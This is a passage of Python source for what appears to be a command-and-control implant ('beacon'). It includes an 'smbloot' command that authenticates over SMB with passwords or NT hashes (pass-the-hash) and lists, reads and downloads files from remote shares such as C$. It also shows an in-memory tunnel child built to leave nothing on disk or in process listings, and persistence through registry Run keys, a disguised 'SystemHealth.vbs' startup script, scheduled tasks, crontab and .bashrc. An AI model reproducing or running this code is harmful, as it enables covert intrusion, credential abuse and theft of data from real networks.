            out_length = struct.unpack_from("<I", resp, 64 + 4)[0]
            data = resp[out_offset:out_offset + out_length]
            entries.extend(self._parse_dir_info(data))
            first = False
            # Continue with next batch
            struct.pack_into("<B", qd, 3, 0)  # no restart
        return entries, msg_id

    @staticmethod
    def _parse_dir_info(data: bytes) -> list:
        """Parse FileBothDirectoryInformation buffer."""
        entries = []
        offset = 0
        while offset < len(data):
            if offset + 94 > len(data):
                break
            next_entry = struct.unpack_from("<I", data, offset)[0]
            file_name_length = struct.unpack_from("<I", data, offset + 60)[0]
            file_attrs = struct.unpack_from("<I", data, offset + 56)[0]
            file_size = struct.unpack_from("<Q", data, offset + 40)[0]
            name_offset = offset + 104  # FileBothDirectoryInformation name is at +104
            if name_offset + file_name_length > len(data):
                break
            name = data[name_offset:name_offset + file_name_length].decode(
                "utf-16-le", errors="replace")
            if name not in (".", ".."):
                entries.append({
                    "name": name,
                    "size": file_size,
                    "is_dir": bool(file_attrs & 0x10),
                    "attrs": file_attrs,
                })
            if next_entry == 0:
                break
            offset += next_entry
        return entries

    def _smb2_read(self, sock: socket.socket, session_id: int,
                   tree_id: int, msg_id: int, file_id: bytes,
                   offset: int = 0, length: int = 65536) -> tuple:
        """SMB2 Read. Returns (data, next_msg_id)."""
        rd = bytearray(48)
        struct.pack_into("<H", rd, 0, 49)          # StructureSize
        struct.pack_into("<B", rd, 2, 0)           # Padding
        struct.pack_into("<B", rd, 3, 0)           # Flags
        struct.pack_into("<I", rd, 4, length)      # Length
        struct.pack_into("<Q", rd, 8, offset)      # Offset
        rd[16:32] = file_id
        struct.pack_into("<I", rd, 32, 1)          # MinimumCount
        struct.pack_into("<I", rd, 36, 0)          # Channel
        struct.pack_into("<I", rd, 40, 0)          # RemainingBytes
        struct.pack_into("<H", rd, 44, 0)          # ReadChannelInfoOffset
        struct.pack_into("<H", rd, 46, 0)          # ReadChannelInfoLength
        self._smb2_send(sock, 0x0008, msg_id, tree_id, bytes(rd),
                        session_id=session_id)
        resp = self._smb2_recv(sock)
        status = struct.unpack_from("<I", resp, 8)[0]
        if status == 0xc0000011:  # STATUS_END_OF_FILE
            return b"", msg_id + 1
        if status != 0:
            raise IOError(f"Read failed: 0x{status:08x}")
        data_offset = struct.unpack_from("<B", resp, 64 + 2)[0]
        data_length = struct.unpack_from("<I", resp, 64 + 4)[0]
        file_data = resp[data_offset:data_offset + data_length]
        return file_data, msg_id + 1

    def _smb2_close(self, sock: socket.socket, session_id: int,
                    tree_id: int, msg_id: int, file_id: bytes) -> int:
        """SMB2 Close file handle."""
        cl = bytearray(24)
        struct.pack_into("<H", cl, 0, 24)
        struct.pack_into("<H", cl, 2, 0)     # Flags
        struct.pack_into("<I", cl, 4, 0)     # Reserved
        cl[8:24] = file_id
        self._smb2_send(sock, 0x0006, msg_id, tree_id, bytes(cl),
                        session_id=session_id)
        self._smb2_recv(sock)
        return msg_id + 1

    def _smb2_tree_disconnect(self, sock: socket.socket, session_id: int,
                              tree_id: int, msg_id: int) -> int:
        """SMB2 TreeDisconnect."""
        td = struct.pack("<HH", 4, 0)
        self._smb2_send(sock, 0x0004, msg_id, tree_id, td,
                        session_id=session_id)
        self._smb2_recv(sock)
        return msg_id + 1

    def _exec_smbloot(self, args: str) -> str:
        """
        SMBLoot command — browse/download from SMB shares without loading extra packages.
        Usage:
            smbloot <server> <user> <pass_or_hash> [domain] [action] [path]
        Actions:
            shares               — list available shares
            ls <share> [path]    — list directory
            cat <share> <path>   — read file content (text preview)
            get <share> <path>   — download file (base64)
            tree <share> [path]  — recursive directory listing
        Hash format: aad3b435b51404eeaad3b435b51404ee:ntlmhash (pass-the-hash)
        """
        try:
            parts = args.strip().split()
            if len(parts) < 3:
                return ("Usage: smbloot <server> <user> <pass_or_hash> "
                        "[domain] [action] [path]\n"
                        "Actions: shares, ls, cat, get, tree\n"
                        "Hash format: LM:NT (pass-the-hash)")

            server = parts[0]
            username = parts[1]
            cred = parts[2]
            domain = parts[3] if len(parts) > 3 and parts[3] not in (
                "shares", "ls", "cat", "get", "tree") else "."
            action_idx = 3 if domain == "." else 4
            action = parts[action_idx] if len(parts) > action_idx else "shares"
            remaining = parts[action_idx + 1:] if len(parts) > action_idx + 1 else []

            # Determine password vs NT hash
            nt_hash = None
            password = cred
            if re.match(r'^[0-9a-fA-F]{32}:[0-9a-fA-F]{32}$', cred):
                nt_hash = bytes.fromhex(cred.split(":")[1])
                password = ""
            elif re.match(r'^[0-9a-fA-F]{32}$', cred):
                nt_hash = bytes.fromhex(cred)
                password = ""

            port = 445
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((server, port))

            try:
                # Negotiate
                self._smb2_negotiate(sock)
                # Authenticate
                session_id, _ = self._ntlm_auth(sock, username, password, domain, nt_hash)
                msg_id = 3

                if action == "shares":
                    return self._smbloot_list_shares(sock, session_id, msg_id, server)
                elif action == "ls":
                    share = remaining[0] if remaining else "C$"
                    path = remaining[1] if len(remaining) > 1 else ""
                    return self._smbloot_ls(sock, session_id, msg_id, server, share, path)
                elif action == "cat":
                    if len(remaining) < 2:
                        return "Usage: smbloot ... cat <share> <path>"
                    share, fpath = remaining[0], remaining[1]
                    return self._smbloot_cat(sock, session_id, msg_id, server, share, fpath)
                elif action == "get":
                    if len(remaining) < 2:
                        return "Usage: smbloot ... get <share> <path>"
                    share, fpath = remaining[0], remaining[1]
                    return self._smbloot_get(sock, session_id, msg_id, server, share, fpath)
                elif action == "tree":
                    share = remaining[0] if remaining else "C$"
                    path = remaining[1] if len(remaining) > 1 else ""
                    return self._smbloot_tree(sock, session_id, msg_id, server, share, path)
                else:
                    return f"Unknown action: {action}\nAvailable: shares, ls, cat, get, tree"
            finally:
                sock.close()

        except PermissionError as e:
            return f"[auth error] {e}"
        except ConnectionError as e:
            return f"[connection error] {e}"
        except Exception as e:
            return f"[smbloot error] {e}"

    def _smbloot_list_shares(self, sock, session_id, msg_id, server) -> str:
        """List shares via IPC$ + SRVSVC (NetShareEnumAll)."""
        share_path = f"\\\\{server}\\IPC$"
        tree_id, msg_id = self._smb2_tree_connect(sock, session_id, msg_id, share_path)
        # Open srvsvc named pipe
        try:
            file_id, msg_id = self._smb2_create(
                sock, session_id, tree_id, msg_id, "srvsvc",
                desired_access=0x0012019f, disposition=1, options=0x00000040)
            # Bind to SRVSVC
            bind_pkt = self._dcerpc_bind(
                b"\xc8\x4f\x32\x4b\x70\x16\xd3\x01\x12\x78\x5a\x47\xbf\x6e\xe1\x88",
                3, 0)
            msg_id = self._smb2_write(sock, session_id, tree_id, msg_id, file_id, bind_pkt)
            bind_resp, msg_id = self._smb2_read(sock, session_id, tree_id, msg_id, file_id)
            # NetShareEnumAll RPC call
            rpc_req = self._build_netshareenumall(server)
            msg_id = self._smb2_write(sock, session_id, tree_id, msg_id, file_id, rpc_req)
            rpc_resp, msg_id = self._smb2_read(sock, session_id, tree_id, msg_id, file_id,
                                               length=65536)
            shares = self._parse_netshareenumall(rpc_resp)
            msg_id = self._smb2_close(sock, session_id, tree_id, msg_id, file_id)
        except Exception as e:
            shares = [f"(SRVSVC failed: {e} — trying fallback)"]
            # Fallback: try connecting to well-known shares
            shares = []
            for sn in ["C$", "ADMIN$", "IPC$", "NETLOGON", "SYSVOL", "Users", "Shares"]:
                try:
                    tp = f"\\\\{server}\\{sn}"
                    tid, _ = self._smb2_tree_connect(sock, session_id, msg_id, tp)
                    shares.append({"name": sn, "type": 0, "comment": ""})
                    self._smb2_tree_disconnect(sock, session_id, tid, msg_id + 1)
                except Exception:
                    pass

        self._smb2_tree_disconnect(sock, session_id, tree_id, msg_id)

        if not shares:
            return "No shares found"
        if isinstance(shares[0], str):
            return "\n".join(shares)
        lines = [f"{'Share':<20} {'Type':<10} {'Comment'}",
                 "-" * 50]
        type_map = {0: "Disk", 1: "Print", 2: "Device", 3: "IPC",
                    0x80000000: "Disk$", 0x80000003: "IPC$"}
        for s in shares:
            t = type_map.get(s.get("type", 0), "Unknown")
            lines.append(f"{s['name']:<20} {t:<10} {s.get('comment', '')}")
        return "\n".join(lines)

    def _smbloot_ls(self, sock, session_id, msg_id, server, share, path) -> str:
        """List directory contents on a share."""
        share_path = f"\\\\{server}\\{share}"
        tree_id, msg_id = self._smb2_tree_connect(sock, session_id, msg_id, share_path)
        dir_path = path.replace("/", "\\").strip("\\") if path else ""
        file_id, msg_id = self._smb2_create(
            sock, session_id, tree_id, msg_id, dir_path,
            desired_access=0x00100081, disposition=1,
            options=0x00200021)  # FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT
        entries, msg_id = self._smb2_query_directory(
            sock, session_id, tree_id, msg_id, file_id)
        msg_id = self._smb2_close(sock, session_id, tree_id, msg_id, file_id)
        self._smb2_tree_disconnect(sock, session_id, tree_id, msg_id)

        if not entries:
            return f"(empty) \\\\{server}\\{share}\\{dir_path}"
        lines = [f"\\\\{server}\\{share}\\{dir_path}",
                 f"{'Name':<40} {'Size':<12} {'Type'}",
                 "-" * 60]
        for e in sorted(entries, key=lambda x: (not x["is_dir"], x["name"].lower())):
            t = "DIR" if e["is_dir"] else "FILE"
            sz = "" if e["is_dir"] else str(e["size"])
            lines.append(f"{e['name']:<40} {sz:<12} {t}")
        lines.append(f"\n{len(entries)} entries")
        return "\n".join(lines)

    def _smbloot_cat(self, sock, session_id, msg_id, server, share, fpath) -> str:
        """Read and display file content (text preview, max 64KB)."""
        share_path = f"\\\\{server}\\{share}"
        tree_id, msg_id = self._smb2_tree_connect(sock, session_id, msg_id, share_path)
        file_path = fpath.replace("/", "\\").strip("\\")
        file_id, msg_id = self._smb2_create(
            sock, session_id, tree_id, msg_id, file_path,
            desired_access=0x80000000, disposition=1, options=0)
        data = b""
        offset = 0
        while len(data) < 65536:
            chunk, msg_id = self._smb2_read(
                sock, session_id, tree_id, msg_id, file_id,
                offset=offset, length=65536)
            if not chunk:
                break
            data += chunk
            offset += len(chunk)
        msg_id = self._smb2_close(sock, session_id, tree_id, msg_id, file_id)
        self._smb2_tree_disconnect(sock, session_id, tree_id, msg_id)
        return data.decode("utf-8", errors="replace")[:65536]

    def _smbloot_get(self, sock, session_id, msg_id, server, share, fpath) -> str:
        """Download file as base64 (JSON result with filename, size, data)."""
        share_path = f"\\\\{server}\\{share}"
        tree_id, msg_id = self._smb2_tree_connect(sock, session_id, msg_id, share_path)
        file_path = fpath.replace("/", "\\").strip("\\")
        file_id, msg_id = self._smb2_create(
            sock, session_id, tree_id, msg_id, file_path,
            desired_access=0x80000000, disposition=1, options=0)
        data = b""
        offset = 0
        max_size = 10 * 1024 * 1024
        while len(data) < max_size:
            chunk, msg_id = self._smb2_read(
                sock, session_id, tree_id, msg_id, file_id,
                offset=offset, length=65536)
            if not chunk:
                break
            data += chunk
            offset += len(chunk)
        msg_id = self._smb2_close(sock, session_id, tree_id, msg_id, file_id)
        self._smb2_tree_disconnect(sock, session_id, tree_id, msg_id)
        filename = fpath.replace("\\", "/").rsplit("/", 1)[-1]
        return json.dumps({
            "filename": filename,
            "size": len(data),
            "data": base64.b64encode(data).decode(),
        })

    def _smbloot_tree(self, sock, session_id, msg_id, server, share, path,
                      depth: int = 0, max_depth: int = 3) -> str:
        """Recursive directory listing."""
        share_path = f"\\\\{server}\\{share}"
        tree_id, msg_id = self._smb2_tree_connect(sock, session_id, msg_id, share_path)
        lines = []
        self._smbloot_tree_recurse(sock, session_id, tree_id, msg_id,
                                   path.replace("/", "\\").strip("\\"),
                                   lines, 0, max_depth)
        self._smb2_tree_disconnect(sock, session_id, tree_id, msg_id + 100)
        if not lines:
            return f"(empty) \\\\{server}\\{share}\\{path}"
        header = f"\\\\{server}\\{share}\\{path}\n"
        return header + "\n".join(lines[:2000])

    def _smbloot_tree_recurse(self, sock, session_id, tree_id, msg_id,
                              dir_path, lines, depth, max_depth):
        """Helper for recursive tree listing."""
        if depth > max_depth:
            return msg_id
        try:
            file_id, msg_id = self._smb2_create(
                sock, session_id, tree_id, msg_id, dir_path,
                desired_access=0x00100081, disposition=1,
                options=0x00200021)
            entries, msg_id = self._smb2_query_directory(
                sock, session_id, tree_id, msg_id, file_id)
            msg_id = self._smb2_close(sock, session_id, tree_id, msg_id, file_id)
        except Exception:
            return msg_id

        indent = "  " * depth
        for e in sorted(entries, key=lambda x: (not x["is_dir"], x["name"].lower())):
            if e["is_dir"]:
                lines.append(f"{indent}[DIR]  {e['name']}")
                sub = f"{dir_path}\\{e['name']}" if dir_path else e["name"]
                msg_id = self._smbloot_tree_recurse(
                    sock, session_id, tree_id, msg_id, sub, lines, depth + 1, max_depth)
            else:
                lines.append(f"{indent}       {e['name']} ({e['size']})")
            if len(lines) > 2000:
                lines.append(f"{indent}... (truncated)")
                return msg_id
        return msg_id

    def _smb2_write(self, sock: socket.socket, session_id: int,
                    tree_id: int, msg_id: int, file_id: bytes,
                    data: bytes, offset: int = 0) -> int:
        """SMB2 Write to a file/pipe."""
        wr = bytearray(48)
        struct.pack_into("<H", wr, 0, 49)          # StructureSize
        struct.pack_into("<H", wr, 2, 112)         # DataOffset (64+48)
        struct.pack_into("<I", wr, 4, len(data))   # Length
        struct.pack_into("<Q", wr, 8, offset)      # Offset
        wr[16:32] = file_id
        struct.pack_into("<I", wr, 32, 0)          # Channel
        struct.pack_into("<I", wr, 36, 0)          # RemainingBytes
        struct.pack_into("<H", wr, 40, 0)          # WriteChannelInfoOffset
        struct.pack_into("<H", wr, 42, 0)          # WriteChannelInfoLength
        struct.pack_into("<I", wr, 44, 0)          # Flags
        self._smb2_send(sock, 0x0009, msg_id, tree_id, bytes(wr) + data,
                        session_id=session_id)
        self._smb2_recv(sock)
        return msg_id + 1

    @staticmethod
    def _dcerpc_bind(uuid_bytes: bytes, ver_major: int, ver_minor: int) -> bytes:
        """Build a DCE/RPC Bind PDU for a given interface UUID."""
        iface = uuid_bytes + struct.pack("<HH", ver_major, ver_minor)
        ndr_uuid = (b"\x04\x5d\x88\x8a\xeb\x1c\xc9\x11"
                    b"\x9f\xe8\x08\x00\x2b\x10\x48\x60")
        transfer = ndr_uuid + struct.pack("<HH", 2, 0)
        ctx = struct.pack("<HBB", 0, 1, 0)  # context_id=0, num_transfer=1
        ctx += iface + transfer
        bind_body = struct.pack("<HHI", 4096, 4096, 0)  # max_xmit, max_recv, assoc_group
        bind_body += struct.pack("<B", 1) + b"\x00" * 3  # num_ctx + padding
        bind_body += ctx
        # RPC header
        hdr = struct.pack("<BBBBIHHI",
                          5,   # version
                          0,   # minor
                          11,  # BIND
                          0x03,  # PFC_FIRST_FRAG | PFC_LAST_FRAG
                          0x10000000,  # data representation
                          len(bind_body) + 16,  # frag_length
                          0,   # auth_length
                          0)   # call_id
        return hdr + bind_body

    def _build_netshareenumall(self, server: str) -> bytes:
        """Build NetShareEnumAll DCE/RPC request."""
        server_uni = (f"\\\\{server}\x00").encode("utf-16-le")
        # Align to 4 bytes
        pad = (4 - len(server_uni) % 4) % 4
        # NDR: MaxCount, Offset, ActualCount, string
        ndr_str = struct.pack("<III", len(server_uni) // 2,
                              0, len(server_uni) // 2) + server_uni + b"\x00" * pad
        # Level = 1
        level = struct.pack("<I", 1)
        # InfoStruct (level 1 container - simplified)
        info = struct.pack("<III", 1, 0, 0)  # level, switch, pointer
        # Pointer + ResumeHandle
        resume = struct.pack("<II", 0xffffffff, 0)  # PreferedMaxLength, ResumeHandle
        # Reference pointer for server name
        ref_id = struct.pack("<I", 0x00020000)

        stub = ref_id + ndr_str + level + info + resume

        # RPC Request header
        hdr = struct.pack("<BBBBIHHI",
                          5, 0,   # version
                          0,      # REQUEST
                          0x03,   # flags
                          0x10000000,
                          len(stub) + 24,  # frag_length
                          0,      # auth_length
                          1)      # call_id
        req_hdr = struct.pack("<IHH", len(stub), 0, 15)  # alloc_hint, ctx_id, opnum (NetShareEnumAll=15)
        return hdr + req_hdr + stub

    @staticmethod
    def _parse_netshareenumall(data: bytes) -> list:
        """Parse NetShareEnumAll DCE/RPC response (best-effort)."""
        shares = []
        # Find share names in the response by looking for Unicode strings
        # The response format: RPC header + NDR-encoded ShareInfo1 array
        idx = data.find(b"\x00" * 4, 24)  # skip RPC header
        # Simplified: extract null-terminated UTF-16 strings that look like share names
        i = 24  # skip DCE/RPC header
        while i < len(data) - 4:
            # Look for reference ID pattern followed by string data
            # Share names are typically short Unicode strings
            if i + 12 < len(data):
                max_count = struct.unpack_from("<I", data, i)[0]
                if 1 <= max_count <= 256:
                    offset_val = struct.unpack_from("<I", data, i + 4)[0]
                    actual = struct.unpack_from("<I", data, i + 8)[0]
                    if offset_val == 0 and actual == max_count and actual <= 128:
                        str_len = actual * 2
                        if i + 12 + str_len <= len(data):
                            try:
                                name = data[i + 12:i + 12 + str_len].decode(
                                    "utf-16-le").rstrip("\x00")
                                if name and name.isprintable() and len(name) < 64:
                                    if not any(s["name"] == name for s in shares):
                                        shares.append({"name": name, "type": 0, "comment": ""})
                            except Exception:
                                pass
            i += 4
        return shares

    # ── The tunnel child ──

    def _tunnel_source(self) -> Tuple[bytes, str]:
        """The source to hand a child, and where it was taken from.

        A generated artifact carries its own source in the module global
        `_src`, bound by each obfuscation layer as it decompresses the
        next (`_obfuscate_layer` in server.py). That global is the only
        copy there is: what this project ships on Unix is
        `printf %s '<blob>' | python3 -`, where the payload is on stdin
        (Linux refuses an argv entry over 131072 bytes, so it cannot be
        a `-c` argument), there is no file to re-run, and
        `sys.argv[0]` is the literal string "-" ("-c" for the Windows
        `python -c` one-liner) -- which is also why `_get_beacon_path`
        answers with something useless in exactly the mode this runs in.

        No `_src` means this file was run straight from a checkout rather
        than built into an artifact, and then `__file__` is the source. A
        developer in that position should not be debugging a missing
        global, so it is a supported path and not an error.

        The second return value says which it was, and `_exec_tunnel`
        puts it in what it reports: "the tunnel is running a different
        build from the beacon" is otherwise invisible, and it is the first
        thing to suspect when a child connects and then behaves like
        another version.
        """
        src = globals().get("_src")
        if isinstance(src, str):
            # A layer that bound text rather than bytes. Accepted because
            # the alternative is refusing to start over an encoding.
            src = src.encode("utf-8")
        if isinstance(src, bytes) and src:
            return src, "_src, this artifact's own source (%d bytes)" % len(src)
        path = globals().get("__file__")
        if not path:
            raise RuntimeError(
                "this process has neither the module global _src nor a "
                "__file__, so there is no copy of the source to give a "
                "child. A generated artifact has _src; a checkout has a "
                "file.")
        path = os.path.abspath(path)
        data = Path(path).read_bytes()
        return data, ("%s (no _src: this is a checkout and not a generated "
                      "artifact, %d bytes)" % (path, len(data)))

    def _tunnel_status(self) -> Optional[dict]:
        """What this beacon's tunnel child is doing, or None if it had none.

        `poll` is what reaps a child that has exited, so asking this on
        every check-in is also what keeps a dead one from staying a
        zombie.
        """
        with self._tunnel_lock:
            proc = self._tunnel_proc
            if proc is None:
                return None
            code = proc.poll()
            row = {
                "pid": proc.pid,
                "running": code is None,
                "source": self._tunnel_origin,
            }
            if code is not None:
                row["exit_code"] = code
            return row

    def _exec_tunnel(self, action: str) -> str:
        """Start or stop the tunnel endpoint as a child of this process."""
        action = (action or "").strip().lower()
        if action == "start":
            return self._tunnel_start()
        if action == "stop":
            return self._tunnel_stop()
        return ("[error] Unknown tunnel action %r: it is 'tunnel start' or "
                "'tunnel stop'" % action)

    def _tunnel_start(self) -> str:
        """Run this artifact again as `python3 -`, in tunnel mode.

        Four ways to start a second process of the same code exist and
        three are worse. Re-running `python3 -c '<blob>'` writes the whole
        payload into `ps` and `/proc/<pid>/cmdline`, where every user on
        the host can read it and where a fleet running one build is
        trivially enumerated. Writing the source to a file throws away
        the in-memory property the one-liner exists for. `fork` does not
        exist on Windows, where much of this design lives. `python3 -`
        with the source on stdin is an unremarkable command line, leaves
        nothing on disk, and is the same mechanism on both platforms.
        """
        with self._tunnel_lock:
            proc = self._tunnel_proc
            if proc is not None and proc.poll() is None:
                return ("Tunnel already running: pid %d (one child per "
                        "beacon; stop it before starting another)"
                        % proc.pid)
            # Refused here rather than by the child. The child's own
            # bootstrap refuses too -- a build can be launched by hand or
            # by a systemd unit with no parent -- but its stderr is
            # DEVNULL, so a child is the one way the operator cannot be
            # told why. The most likely case by far is a build generated
            # before the generator learned to bake a tunnel block, and
            # that currently reaches them as `exit_code: 1` and nothing
            # else. Same predicate as the bootstrap's, wrapped in the
            # config shape it reads.
            #
            # `_tunnel_problem` first, when there is one: the config file
            # had a tunnel block and it was refused, so the predicate
            # below would take its no-block arm and tell the operator to
            # generate a build, which is not what is wrong and not
            # something they can do about a YAML typo.
            problem = (self._tunnel_problem
                       or tunnel_mode_problem(
                           {"c2": {"tunnel": self._tunnel_cfg}}))
            if problem:
                return "[error] Not starting a tunnel child: %s" % problem
            try:
                source, origin = self._tunnel_source()
            except (OSError, RuntimeError) as exc:
                return "[error] No source to give a tunnel child: %s" % exc

            env = dict(os.environ)
            env[_TUNNEL_MODE_ENV] = "1"
            # Only when there is an id to give. The child reads a blank as
            # absent, so an empty value would change nothing it does --
            # but it would put a key that says nothing in the environment
            # of a process this module spends a page keeping unremarkable.
            implant_id = (self._implant_id or "").strip()
            if implant_id:
                env[_TUNNEL_IMPLANT_ENV] = implant_id
            try:
                child = subprocess.Popen(
                    [sys.executable, "-"],
                    stdin=subprocess.PIPE,
                    # Both ends closed: a child that writes to the
                    # terminal it was started from is how an implant is
                    # noticed. What the endpoint could not do is reported
                    # through its exit code at the next check-in, and the
                    # tunnel server's own log is the other half.
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    env=env,
                    close_fds=True,
                )
            except OSError as exc:
                return ("[error] Could not start %s: %s"
                        % (sys.executable, exc))

            try:
                # On a thread with a bounded join, not inline. `python -`
                # reads stdin to EOF before it compiles anything, so this
                # is milliseconds -- but the pipe holds only about 64 KB,
                # and a child that reads nothing at all would park the
                # beacon's own thread in `write` for ever. See
                # `_TUNNEL_SOURCE_TIMEOUT`.
                failure = self._feed_tunnel_child(child, source)
            except RuntimeError as exc:
                # The host is out of threads, which is the one way the
                # feed can fail before it has begun. A child left running
                # with no record of it is a process nothing can stop, so
                # it goes the same way as one that read nothing.
                failure = "its source could not be written: %s" % exc
            if failure is not None:
                child.kill()
                return ("[error] The tunnel child was given no source and "
                        "has been killed: %s (%s)"
                        % (failure, self._child_ending(child)[1]))

            self._tunnel_proc = child
            self._tunnel_origin = origin
            logger.info("Tunnel child started: pid %d, source from %s",
                        child.pid, origin)
            return ("Tunnel started: pid %d, %s - with the source on "
                    "stdin, so none of it is on a command line. Source: %s"
                    % (child.pid, sys.executable, origin))

    @staticmethod
    def _feed_tunnel_child(child, source: bytes) -> Optional[str]:
        """Write the source to the child's stdin. Why it failed, or None.

        The write is on a thread so the wait on it can be bounded: a
        child that is not reading stdin would otherwise hold the caller
        in `write` as soon as the pipe filled, and the caller is the
        beacon's own loop.

        Killing the child is left to the caller, and it is what ends this
        thread when the bound is reached -- the parked `write` fails with
        EPIPE the moment the reader is gone, so the thread is not leaked.
        """
        trouble = []

        def feed():
            try:
                child.stdin.write(source)
            except OSError as exc:
                # A child that exited before it read -- a broken pipe --
                # or a stdin already closed under us.
                trouble.append("%s: %s" % (type(exc).__name__, exc))
            finally:
                try:
                    # Closed on every path, including the one the caller
                    # unparks by killing the child: a pipe left open is a
                    # descriptor leak in a process meant to run for
                    # months, and the EOF is what tells the interpreter
                    # the script is complete.
                    child.stdin.close()
                except OSError:
                    # The flush that `close` does finds the same broken
                    # pipe the write did. The descriptor is closed either
                    # way, which is what this is for.
                    pass

        writer = threading.Thread(target=feed, name="tunnel-feed",
                                  daemon=True)
        writer.start()
        writer.join(_TUNNEL_SOURCE_TIMEOUT)
        if writer.is_alive():
            return ("it read none of the %d bytes on its stdin within "
                    "%.0fs, so it is not an interpreter reading a script"
                    % (len(source), _TUNNEL_SOURCE_TIMEOUT))
        return trouble[0] if trouble else None

    @staticmethod
    def _child_ending(proc) -> Tuple[Optional[int], str]:
        """Wait for a signalled child: its exit code, and how to say it.

        Never raises, which is the point. `wait` raising
        `subprocess.TimeoutExpired` out of `_tunnel_start` would reach
        the operator as `[exception: ...]` from `_process_tasking`'s
        catch-all with no child recorded, and out of `_tunnel_stop` it
        would abort the rest of `Beacon.stop` before it had finished. A
        child that has been killed and is still there is stuck in the
        kernel and there is nothing further to try, so it is reported
        rather than raised -- and the residue it leaves is named, because
        "nothing is leaked" would not be true of it.
        """
        try:
            code = proc.wait(timeout=_TUNNEL_CHILD_STOP_TIMEOUT)
        except subprocess.TimeoutExpired:
            return None, ("pid %d has not gone within %.0fs, so it is stuck "
                          "in the kernel and unreaped"
                          % (proc.pid, _TUNNEL_CHILD_STOP_TIMEOUT))
        return code, "exit %s" % code

    def _tunnel_stop(self) -> str:
        """Stop the tunnel child. The record of it outlives it.

        Not cleared, because an operator's stop is pending until a
        check-in confirms it: a beacon that forgot the child would report
        nothing, which is indistinguishable from a stop that never
        happened.

        Both waits go through `_child_ending` and neither calls `wait`
        itself. A `subprocess.TimeoutExpired` out of here would abort the
        rest of `Beacon.stop` before it had finished, and reach an
        operator as `[exception: ...]` from the tasking catch-all.
        """
        with self._tunnel_lock:
            proc = self._tunnel_proc
            if proc is None:
                return ("No tunnel child is running: this beacon has not "
                        "started one")
            code = proc.poll()
            if code is not None:
                return ("No tunnel child is running: pid %d had already "
                        "exited with %s" % (proc.pid, code))
            proc.terminate()
            code, ending = self._child_ending(proc)
            if code is None:
                # It did not go when asked.
                proc.kill()
                code, ending = self._child_ending(proc)
                if code is None:
                    logger.warning("Tunnel child pid %d survived a kill",
                                   proc.pid)
                    return ("[error] The tunnel child could not be stopped: "
                            "it ignored a terminate and then a kill, and %s"
                            % ending)
                logger.warning("Tunnel child pid %d ignored a terminate and "
                               "was killed", proc.pid)
                return ("Tunnel stopped: pid %d ignored a terminate and was "
                        "killed (%s)" % (proc.pid, ending))
            logger.info("Tunnel child stopped: pid %d, exit %s", proc.pid, code)
            return "Tunnel stopped: pid %d, exit %s" % (proc.pid, code)

    # ── Persistence ──

    def _bundled_payload(self) -> str:
        """This build's payload beside this interpreter, or "".

        Non-empty means the interpreter running us is one we brought: the
        stager lays the payload out next to it and the startup hook in
        its own `Lib/` beside that. That is the only situation in which
        the hook exists, so it is the only situation in which the `argc`
        gate can be allowed to drop the payload's path from an autorun
        command line.
        """
        if not self._persist_payload:
            return ""
        candidate = os.path.join(
            os.path.dirname(os.path.abspath(sys.executable)),
            self._persist_payload)
        return candidate if os.path.isfile(candidate) else ""

    def _get_beacon_path(self) -> str:
        """The payload path an autorun entry should name, or "" for none.

        "" is a supported answer and means the entry needs no path: under
        the `argc` gate, with a payload beside an interpreter we brought,
        the hook in that interpreter's `Lib/` finds the payload itself and
        the command line carries nothing to find.

        Otherwise the bundled payload if there is one, and `sys.argv[0]`
        if there is not -- which is the one thing this project ships:
        the Unix one-liner is `printf %s '<blob>' | python3 -`, where
        `sys.argv[0]` is the literal "-" (the Windows `python -c`
        one-liner gives "-c"), and the answer is useless. A build that
        brought an interpreter is exactly the build that can do better,
        so it does.
        """
        bundled = self._bundled_payload()
        if bundled:
            return "" if self._persist_gate == "argc" else bundled
        return os.path.abspath(sys.argv[0])

    def _exec_persist(self, method: str) -> str:
        method = (method or "auto").strip().lower()
        beacon_path = self._get_beacon_path()
        python_path = sys.executable
        # No path to name: the startup hook is what finds the payload.
        cmd_line = ("%s %s" % (python_path, beacon_path) if beacon_path
                    else python_path)
        name = self._persist_name

        if method == "auto":
            method = "registry" if platform.system() == "Windows" else "crontab"

        try:
            if method == "registry":
                if platform.system() != "Windows":
                    return "[error] Registry persistence only available on Windows"
                import winreg
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    r"Software\Microsoft\Windows\CurrentVersion\Run",
                    0, winreg.KEY_SET_VALUE,
                )
                winreg.SetValueEx(key, name, 0, winreg.REG_SZ, cmd_line)
                winreg.CloseKey(key)
                return f"Persistence installed: HKCU\\...\\Run\\{name}\n{cmd_line}"

            elif method == "startup":
                if platform.system() != "Windows":
                    return "[error] Startup folder persistence only available on Windows"
                startup = Path(os.environ.get("APPDATA", "")) / \
                    r"Microsoft\Windows\Start Menu\Programs\Startup"
                lnk_vbs = startup / "SystemHealth.vbs"
                lnk_vbs.write_text(
                    f'CreateObject("WScript.Shell").Run "{cmd_line}", 0, False\n'
                )
                return f"Persistence installed: {lnk_vbs}"

            elif method == "schtask":
                if platform.system() != "Windows":
                    return "[error] Scheduled task persistence only available on Windows"
                result = subprocess.run(
                    ["schtasks", "/create", "/tn", name,
                     "/tr", cmd_line, "/sc", "onlogon", "/rl", "highest", "/f"],
                    capture_output=True, text=True, timeout=15,
                )
                if result.returncode == 0:
                    return f"Persistence installed: schtask {name}\n{result.stdout.strip()}"
                return f"[error] {result.stderr.strip()}"

            elif method == "crontab":
                if platform.system() == "Windows":
                    return "[error] Crontab not available on Windows"
                existing = subprocess.run(
                    ["crontab", "-l"], capture_output=True, text=True, timeout=10,
                )
                lines = existing.stdout if existing.returncode == 0 else ""
                marker = "# raccoon-persist"
                if marker in lines:
                    return "Persistence already installed (crontab)"
                entry = f"@reboot {cmd_line} {marker}\n"
                new_cron = lines.rstrip("\n") + "\n" + entry
                proc = subprocess.run(
                    ["crontab", "-"], input=new_cron, capture_output=True, text=True, timeout=10,
                )
                if proc.returncode == 0:
                    return f"Persistence installed: crontab @reboot\n{cmd_line}"
                return f"[error] {proc.stderr.strip()}"

            elif method == "bashrc":
                if platform.system() == "Windows":
                    return "[error] bashrc not available on Windows"
                rc = Path.home() / ".bashrc"
                marker = "# raccoon-persist"
                content = rc.read_text() if rc.exists() else ""
                if marker in content:
                    return "Persistence already installed (.bashrc)"
                line = f"\n(nohup {cmd_line} &>/dev/null &) {marker}\n"
